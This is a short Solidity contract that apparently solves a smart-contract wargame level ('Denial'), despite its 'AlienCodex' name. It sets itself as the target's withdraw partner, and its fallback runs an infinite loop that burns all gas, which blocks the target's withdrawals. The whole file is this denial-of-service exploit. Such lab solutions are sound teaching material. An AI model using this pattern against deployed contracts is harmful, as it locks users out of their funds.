
pragma solidity ^0.8.0;

interface Denial{
  function withdraw() external;
  function setWithdrawPartner(address _partner) external;
}


contract AlienCodex  {

    Denial denial;

    constructor(address _addr) {
        denial = Denial(_addr);
        denial.setWithdrawPartner(address(this));
    }
   

    fallback() payable external{
      uint a = 0;
      while(true)
      {
        a = a+1;
      }
    }
}
